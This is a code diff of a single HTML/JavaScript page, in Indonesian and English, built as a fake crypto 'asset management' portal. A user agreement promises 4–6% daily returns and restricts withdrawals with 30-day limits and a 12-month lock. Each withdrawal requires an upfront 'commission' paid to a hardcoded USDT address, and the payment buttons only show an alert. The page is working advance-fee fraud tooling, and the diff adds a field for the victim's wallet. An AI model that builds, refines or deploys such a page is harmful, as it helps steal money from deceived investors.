@@ -7,127 +7,99 @@
   <style>
     :root { --gold: #fcd535; --bg: #0b0e11; --card: #1e2329; --green: #2ecc71; --text: #eaecef; --subtext: #848e9c; }
     body { background: var(--bg); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; font-family: 'Segoe UI', Roboto, sans-serif; color: var(--text); }
-    .main-container { background: var(--card); width: 360px; border-radius: 28px; border: 1px solid #333; position: relative; overflow: hidden; min-height: 600px; box-shadow: 0 25px 50px rgba(0,0,0,0.7); }
+    .main-container { background: var(--card); width: 360px; border-radius: 28px; border: 1px solid #333; position: relative; overflow: hidden; min-height: 620px; box-shadow: 0 25px 50px rgba(0,0,0,0.7); }
 
     /* --- LOGIN PAGE --- */
     #login-page { position: absolute; inset: 0; background: var(--card); z-index: 100; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 40px; text-align: center; transition: 0.6s cubic-bezier(0.4, 0, 0.2, 1); }
-    .logo-container { width: 90px; height: 90px; background: var(--gold); border-radius: 24px; display: flex; justify-content: center; align-items: center; margin-bottom: 25px; font-size: 45px; color: #000; box-shadow: 0 0 30px rgba(252, 213, 53, 0.25); overflow: hidden; }
+    .logo-container { width: 90px; height: 90px; background: var(--gold); border-radius: 24px; display: flex; justify-content: center; align-items: center; margin-bottom: 25px; font-size: 45px; color: #000; overflow: hidden; }
     .icon-anim { display: flex; flex-direction: column; animation: slideIcon 10s infinite; }
     .icon-anim span { height: 90px; display: flex; justify-content: center; align-items: center; }
-    @keyframes slideIcon { 
-      0%, 15% { transform: translateY(0); } /* BTC */
-      20%, 35% { transform: translateY(-90px); } /* ETH */
-      40%, 55% { transform: translateY(-180px); } /* USDT */
-      60%, 75% { transform: translateY(-270px); } /* BNB */
-      80%, 95% { transform: translateY(-360px); } /* SOL */
-      100% { transform: translateY(0); }
-    }
-    .login-input { width: 100%; padding: 16px; margin: 20px 0; border-radius: 14px; border: 1px solid #444; background: var(--bg); color: var(--gold); font-size: 18px; text-align: center; outline: none; transition: 0.3s; }
-    .login-input:focus { border-color: var(--gold); }
-    .btn-corp { background: var(--gold); color: #000; width: 100%; padding: 16px; border-radius: 14px; font-weight: bold; border: none; cursor: pointer; font-size: 16px; transition: 0.2s; }
-    .btn-corp:active { transform: scale(0.97); }
+    @keyframes slideIcon { 0%, 15% { transform: translateY(0); } 20%, 35% { transform: translateY(-90px); } 40%, 55% { transform: translateY(-180px); } 60%, 75% { transform: translateY(-270px); } 80%, 95% { transform: translateY(-360px); } 100% { transform: translateY(0); } }
+    .login-input { width: 100%; padding: 16px; margin: 20px 0; border-radius: 14px; border: 1px solid #444; background: var(--bg); color: var(--gold); font-size: 18px; text-align: center; outline: none; }
+    .btn-corp { background: var(--gold); color: #000; width: 100%; padding: 16px; border-radius: 14px; font-weight: bold; border: none; cursor: pointer; font-size: 16px; }
 
     /* --- DASHBOARD --- */
     #dashboard-page { display: none; padding: 25px; animation: fadeIn 0.8s; position: relative; }
     .nav-icons { position: absolute; top: 20px; right: 20px; display: flex; gap: 15px; font-size: 22px; cursor: pointer; color: var(--subtext); z-index: 10; }
-    .coin-hero { width: 60px; height: 60px; background: var(--green); color: #fff; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 30px auto 10px; font-size: 32px; font-weight: bold; box-shadow: 0 5px 15px rgba(46, 204, 113, 0.3); }
-    .balance-display { font-size: 48px; font-weight: bold; color: var(--gold); text-align: center; margin: 10px 0; letter-spacing: -1px; }
+    .coin-hero { width: 60px; height: 60px; background: var(--green); color: #fff; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 30px auto 10px; font-size: 32px; font-weight: bold; }
+    .balance-display { font-size: 48px; font-weight: bold; color: var(--gold); text-align: center; margin: 10px 0; }
 
-    /* --- MODALS & AGREEMENT --- */
+    /* --- MODALS --- */
     .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 1000; justify-content: center; align-items: center; padding: 20px; }
     .modal-box { background: var(--card); padding: 25px; border-radius: 24px; width: 100%; max-width: 320px; border: 1px solid var(--gold); max-height: 85vh; overflow-y: auto; }
     .agreement-text { text-align: left; font-size: 12px; line-height: 1.6; color: var(--subtext); }
     .agreement-text b { color: var(--text); }
-    .rule-item { margin-bottom: 15px; padding-bottom: 10px; border-bottom: 1px solid #333; }
+    .rule-item { margin-bottom: 12px; padding-bottom: 8px; border-bottom: 1px solid #333; }
     
-    #panel-history { position: absolute; top: 0; left: 100%; width: 100%; height: 100%; background: var(--card); transition: 0.4s; z-index: 150; padding: 25px; box-sizing: border-box; overflow-y: auto; }
-    #panel-history.open { left: 0; }
-
-    input, select { width: 100%; padding: 12px; margin: 10px 0; border-radius: 10px; border: 1px solid #333; background: var(--bg); color: white; box-sizing: border-box; text-align: center; outline: none; }
+    input, select { width: 100%; padding: 12px; margin: 8px 0; border-radius: 10px; border: 1px solid #333; background: var(--bg); color: white; box-sizing: border-box; text-align: center; outline: none; font-size: 13px; }
     .address-box { background: var(--bg); padding: 15px; border-radius: 12px; font-size: 11px; word-break: break-all; color: var(--gold); border: 1px dashed var(--gold); margin: 15px 0; cursor: pointer; font-family: monospace; }
-    .tag-info { background: #2b3139; padding: 12px; border-radius: 12px; font-size: 11px; color: var(--subtext); margin: 10px 0; }
+    .tag-info { background: #2b3139; padding: 12px; border-radius: 12px; font-size: 11px; color: var(--subtext); margin: 10px 0; text-align: left; }
     .btn-secondary { background: none; border: none; color: var(--subtext); width: 100%; margin-top: 15px; cursor: pointer; font-size: 13px; text-decoration: underline; }
-    @keyframes fadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
+    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
   </style>
 </head>
 <body>
 
   <div class="main-container">
-    
     <div id="login-page">
-      <div style="position:absolute; top:20px; right:20px; color:var(--subtext); cursor:pointer; font-size:20px;" onclick="openModal('modal-agreement')">📜</div>
-      <div class="logo-container">
-        <div class="icon-anim">
-          <span>₿</span><span>Ξ</span><span>₮</span><span>◈</span><span>◎</span>
-        </div>
-      </div>
-      <h2 style="margin:0; letter-spacing:1px;">CORP ACCESS</h2>
-      <p style="color: var(--subtext); font-size: 12px; margin-top: 5px;">Secure Financial Management System</p>
-      
-      <input type="password" id="pin-field" class="login-input" placeholder="Masukkan Kode Akses">
-      
+      <div style="position:absolute; top:20px; right:20px; color:var(--subtext); cursor:pointer;" onclick="openModal('modal-agreement')">📜</div>
+      <div class="logo-container"><div class="icon-anim"><span>₿</span><span>Ξ</span><span>₮</span><span>◈</span><span>◎</span></div></div>
+      <h2 style="margin:0;">CORP ACCESS</h2>
+      <input type="password" id="pin-field" class="login-input" placeholder="Akses Kode">
       <button class="btn-corp" onclick="handleLogin()">AUTHENTICATE</button>
-      <div id="error-msg" style="color: #f6465d; font-size: 11px; margin-top: 15px; display: none;">Invalid Access Code. Case-Sensitive.</div>
-      
-      <p style="margin-top:40px; font-size:10px; color:#444;">&copy; 2024 Global Asset Management Ltd.</p>
+      <div id="error-msg" style="color: #f6465d; font-size: 11px; margin-top: 15px; display: none;">PIN Salah (Case-Sensitive)</div>
     </div>
 
     <div id="dashboard-page">
-      <div class="nav-icons">
-        <span onclick="openModal('modal-agreement')">📜</span>
-        <span onclick="toggleHistory(true)">🕒</span>
-      </div>
-      
+      <div class="nav-icons"><span onclick="openModal('modal-agreement')">📜</span><span onclick="toggleHistory(true)">🕒</span></div>
       <div style="text-align:center;">
         <div class="coin-hero">₮</div>
         <div id="user-info" style="font-size: 11px; color: var(--subtext);">Synchronizing...</div>
         <p style="margin: 20px 0 0; font-size: 13px; color: var(--subtext);">Total Portofolio Aktif</p>
         <div id="main-balance" class="balance-display">0.00</div>
-        <div style="background: #2b3139; padding: 6px 18px; border-radius: 10px; width: fit-content; margin: 0 auto; color: #f3ba2f; font-weight: bold; font-size: 13px; letter-spacing: 1px;">USDT TETHER</div>
       </div>
-
       <div style="display: flex; gap: 15px; margin-top: 45px;">
         <button style="flex:1; padding:16px; border-radius:14px; border:none; background:#2b3139; color:#fff; font-weight:bold; cursor:pointer;" onclick="openModal('modal-setor')">SETOR</button>
         <button style="flex:1; padding:16px; border-radius:14px; border:none; background:var(--gold); color:#000; font-weight:bold; cursor:pointer;" onclick="openModal('modal-tarik')">TARIK</button>
       </div>
 
-      <div id="panel-history">
+      <div id="panel-history" style="position: absolute; top: 0; left: 100%; width: 100%; height: 100%; background: var(--card); transition: 0.4s; z-index: 150; padding: 25px; box-sizing: border-box; overflow-y: auto;">
         <button onclick="toggleHistory(false)" style="background:none; border:none; color:var(--gold); cursor:pointer; font-weight:bold; margin-bottom: 20px;">← KEMBALI</button>
-        <h3 style="margin:0 0 20px 0; border-bottom:1px solid #333; padding-bottom:10px;">Log Aktivitas</h3>
-        <div id="transaction-list" style="font-size: 13px;"></div>
+        <h3 style="margin:0 0 20px 0; border-bottom:1px solid #333;">Log Aktivitas</h3>
+        <div id="transaction-list"></div>
       </div>
     </div>
   </div>
 
   <div id="modal-agreement" class="modal">
     <div class="modal-box">
-      <h3 style="color: var(--gold); margin: 0 0 15px 0; text-align: center;">User Agreement</h3>
+      <h3 style="color: var(--gold); text-align: center; margin-bottom: 15px;">User Agreement</h3>
       <div class="agreement-text">
         <div class="rule-item">
-          <b>1. Rasio Pertumbuhan Portofolio (Yield):</b><br>
-          • Saldo < $1,000 : <b>4.0% per hari</b><br>
-          • Saldo $1,000 - $10,000 : <b>5.0% per hari</b><br>
-          • Saldo > $10,000 : <b>6.0% per hari</b>
+          <b>1. Rasio Pertumbuhan Saldo:</b><br>
+          • Nominal < $1000: <b>4%/hari</b><br>
+          • Nominal $1000 - $10000: <b>5%/hari</b><br>
+          • Nominal > $10000: <b>6%/hari</b>
         </div>
         <div class="rule-item">
-          <b>2. Kebijakan Perpajakan:</b><br>
-          Penyetoran dan Penarikan internal <b>bebas pajak (Tax-Free)</b>. Pajak penarikan eksternal sepenuhnya menjadi tanggung jawab nasabah saat diterima di alamat tujuan.
+          <b>2. Kebijakan Pajak:</b><br>
+          Penarikan dan deposit tidak dikenakan pajak internal. Pajak penarikan hanya dikenakan saat dana diterima di alamat tujuan.
         </div>
         <div class="rule-item">
-          <b>3. Biaya Layanan (Komisi):</b><br>
-          Komisi wajib diselesaikan <b>di awal transaksi</b> untuk menjaga integritas daya tahan dana utama. Saldo akan dikirimkan secara utuh tanpa pemotongan internal.
+          <b>3. Pembayaran Komisi:</b><br>
+          Komisi wajib dibayar di awal untuk menghindari pengurangan daya tahan dana. Saldo yang diterima akan dikirimkan secara utuh.
         </div>
         <div class="rule-item">
-          <b>4. Frekuensi Penarikan:</b><br>
-          Sesuai standar manajemen risiko, penarikan portofolio hanya dapat dilakukan <b>30 hari sekali</b>.
+          <b>4. Batas Penarikan:</b><br>
+          Penarikan portofolio dapat dilakukan setiap <b>30 hari sekali</b>.
         </div>
         <div class="rule-item">
-          <b>5. Jadwal Operasional:</b><br>
-          Layanan penarikan <b>tidak tersedia pada hari Sabtu dan Minggu</b>. Namun, proses sinkronisasi server dan perhitungan yield harian tetap berjalan normal.
+          <b>5. Hari Operasional:</b><br>
+          Tidak ada layanan penarikan pada hari Sabtu dan Minggu. Namun, aktivitas server dan perhitungan harian tetap berjalan normal.
         </div>
         <div class="rule-item">
-          <b>6. Masa Kontrak (Vesting Period):</b><br>
-          Masa kontrak pengendapan dana adalah <b>12 bulan</b> pada tahun pertama. Untuk pemilihan server <b>Instant</b>, terdapat penambahan masa kontrak sebesar <b>+3 bulan</b>.
+          <b>6. Masa Kontrak:</b><br>
+          Masa kontrak pengendapan saldo adalah <b>12 bulan</b> pada tahun pertama. Pemilihan server <b>Instant</b> menambah masa kontrak sebanyak <b>+3 bulan</b>.
         </div>
       </div>
       <button class="btn-corp" style="margin-top:20px;" onclick="closeModal()">SAYA MENGERTI</button>
@@ -137,8 +109,10 @@
   <div id="modal-setor" class="modal">
     <div class="modal-box">
       <h3 style="color: var(--gold); margin:0;">Inbound Transfer</h3>
-      <p style="font-size:11px; color:var(--subtext);">Pilih jaringan aset Anda:</p>
-      <select id="network-setor" onchange="updateSetorAddr()"><option value="TRC20">Network: TRC20 (Tron)</option><option value="ERC20">Network: ERC20 (Ethereum)</option></select>
+      <select id="network-setor" onchange="updateWalletAddr('network-setor', 'setor-addr')">
+        <option value="TRC20">TRC20 (Tron)</option>
+        <option value="ERC20">ERC20 (Ethereum)</option>
+      </select>
       <div class="address-box" id="setor-addr" onclick="copy('setor-addr')">TA5muXrZYo356NXgizCQ7e7GdbKQo9NCG1</div>
       <button class="btn-corp" onclick="confirmAction()">SUBMIT PROOF</button>
       <button class="btn-secondary" onclick="closeModal()">Tutup</button>
@@ -148,25 +122,46 @@
   <div id="modal-tarik" class="modal">
     <div class="modal-box">
       <div id="tarik-step-1">
-        <h3 style="color: var(--gold); margin:0;">Penarikan Portofolio</h3>
+        <h3 style="color: var(--gold); margin:0;">Withdrawal Request</h3>
+        <p style="font-size: 11px; color: var(--subtext); margin-bottom: 10px;">Saldo Tersedia: <b id="draw-balance" style="color: var(--green);">0.00</b> USDT</p>
+        
         <input type="number" id="tarik-jumlah" placeholder="Nominal USDT (Min 10)" oninput="hitungTarik()">
+        
+        <select id="network-tarik-choice">
+          <option value="TRC20">Target: TRC20 (Tron)</option>
+          <option value="ERC20">Target: ERC20 (Ethereum)</option>
+        </select>
+
+        <input type="text" id="user-wallet-addr" placeholder="Alamat USDT Tujuan Anda" style="text-align: left; font-family: monospace;">
+
         <select id="tarik-durasi" onchange="hitungTarik()">
           <option value="0.20" data-days="5">Server: Instant (5 Hari) - +3 Bln Kontrak</option>
           <option value="0.10" data-days="10" selected>Server: Standar (10 Hari)</option>
           <option value="0.05" data-days="15">Server: Minimal (15 Hari)</option>
         </select>
+
         <div class="tag-info">
           <div>Estimasi Pencairan: <b id="view-tgl" style="color:#fff;">-</b></div>
           <div>Service Fee (Early): <b id="view-fee" style="color:var(--gold);">0.00 USDT</b></div>
         </div>
+        
         <button id="btn-next-tarik" class="btn-corp" style="opacity:0.5;" onclick="goTarikStep2()" disabled>APPROVE REQUEST</button>
         <button class="btn-secondary" onclick="closeModal()">Batalkan</button>
       </div>
+
       <div id="tarik-step-2" style="display:none;">
-        <h3 style="color: var(--gold); margin: 0;">Payment Settlement</h3>
-        <p style="font-size:11px; color:var(--subtext);">Selesaikan biaya layanan di bawah ini:</p>
-        <div style="font-size:26px; font-weight:bold; color:var(--gold); margin:15px 0;" id="final-fee">0.00</div>
+        <h3 style="color: var(--gold); margin: 0;">Settlement Payment</h3>
+        <p style="font-size:10px; color:var(--subtext);">Pilih jaringan untuk bayar komisi:</p>
+        
+        <select id="network-settle" onchange="updateWalletAddr('network-settle', 'tarik-addr')">
+          <option value="TRC20">Pay via: TRC20 (Tron)</option>
+          <option value="ERC20">Pay via: ERC20 (Ethereum)</option>
+        </select>
+
+        <div style="font-size:26px; font-weight:bold; color:var(--gold); margin:10px 0;" id="final-fee">0.00</div>
+        
         <div class="address-box" id="tarik-addr" onclick="copy('tarik-addr')">TA5muXrZYo356NXgizCQ7e7GdbKQo9NCG1</div>
+        
         <button class="btn-corp" onclick="confirmAction()">CONFIRM PAYMENT</button>
         <button class="btn-secondary" onclick="goTarikStep1()">Kembali</button>
       </div>
@@ -188,10 +183,7 @@
           document.getElementById('dashboard-page').style.display='block'; 
           fetchData(); setInterval(fetchData, 5000); 
         }, 600);
-      } else { 
-        document.getElementById('error-msg').style.display = 'block';
-        document.getElementById('pin-field').value=""; 
-      }
+      } else { document.getElementById('error-msg').style.display = 'block'; }
     };
 
     async function fetchData() {
@@ -202,6 +194,7 @@
         if(data[0]) {
           currentBalance = data[0].balance;
           document.getElementById('main-balance').innerText = currentBalance.toLocaleString();
+          document.getElementById('draw-balance').innerText = currentBalance.toLocaleString();
           document.getElementById('user-info').innerText = "Security Token: " + data[0].user_name.toUpperCase();
         }
         const resT = await fetch(`${URL}/rest/v1/transactions?select=*&order=id.desc&limit=8`, { headers: h });
@@ -209,24 +202,31 @@
         let html = "";
         dataT.forEach(t => {
           const isPlus = t.type === 'Setor';
-          html += `<div style="display:flex; justify-content:space-between; padding:14px 0; border-bottom:1px solid #333;">
-            <span style="color:#888;">${t.type}</span>
-            <b style="color:${isPlus? '#2ecc71':'#f6465d'}">${isPlus?'+':'-'}${t.amount} USDT</b>
+          html += `<div style="display:flex; justify-content:space-between; padding:12px 0; border-bottom:1px solid #333;">
+            <span style="color:#888;">${t.type}</span><b style="color:${isPlus? '#2ecc71':'#f6465d'}">${isPlus?'+':'-'}${t.amount}</b>
           </div>`;
         });
-        document.getElementById('transaction-list').innerHTML = html || "No records found.";
+        document.getElementById('transaction-list').innerHTML = html || "No records.";
       } catch (e) {}
     }
 
-    window.toggleHistory = (open) => document.getElementById('panel-history').classList.toggle('open', open);
-    window.openModal = (id) => { document.getElementById(id).style.display = 'flex'; if(id==='modal-tarik') goTarikStep1(); };
+    window.openModal = (id) => { 
+      document.getElementById(id).style.display = 'flex'; 
+      if(id==='modal-tarik') goTarikStep1(); 
+    };
     window.closeModal = () => document.querySelectorAll('.modal').forEach(m => m.style.display = 'none');
-    window.copy = (id) => { navigator.clipboard.writeText(document.getElementById(id).innerText); alert("Address copied to clipboard."); };
-    window.confirmAction = () => { alert("Transaction Request Submitted. Pending Approval."); closeModal(); };
-    window.updateSetorAddr = () => document.getElementById('setor-addr').innerText = WALLETS[document.getElementById('network-setor').value];
-    
+    window.copy = (id) => { navigator.clipboard.writeText(document.getElementById(id).innerText); alert("Alamat disalin."); };
+    window.confirmAction = () => { alert("Permintaan terkirim ke sistem!"); closeModal(); };
+    window.toggleHistory = (open) => document.getElementById('panel-history').style.left = open ? '0' : '100%';
+
+    window.updateWalletAddr = (selectId, displayId) => {
+      const net = document.getElementById(selectId).value;
+      document.getElementById(displayId).innerText = WALLETS[net];
+    };
+
     window.hitungTarik = () => {
       const jml = parseFloat(document.getElementById('tarik-jumlah').value) || 0;
+      const wallet = document.getElementById('user-wallet-addr').value;
       const sel = document.getElementById('tarik-durasi');
       const hari = parseInt(sel.options[sel.selectedIndex].getAttribute('data-days'));
       const tgl = new Date(); tgl.setDate(tgl.getDate() + hari);
@@ -234,7 +234,7 @@
       const fee = jml * parseFloat(sel.value);
       document.getElementById('view-fee').innerText = fee.toFixed(2) + " USDT";
       document.getElementById('final-fee').innerText = fee.toFixed(2) + " USDT";
-      const valid = (jml >= 10 && jml <= currentBalance);
+      const valid = (jml >= 10 && jml <= currentBalance && wallet.length > 10);
       document.getElementById('btn-next-tarik').disabled = !valid;
       document.getElementById('btn-next-tarik').style.opacity = valid ? "1" : "0.5";
     };
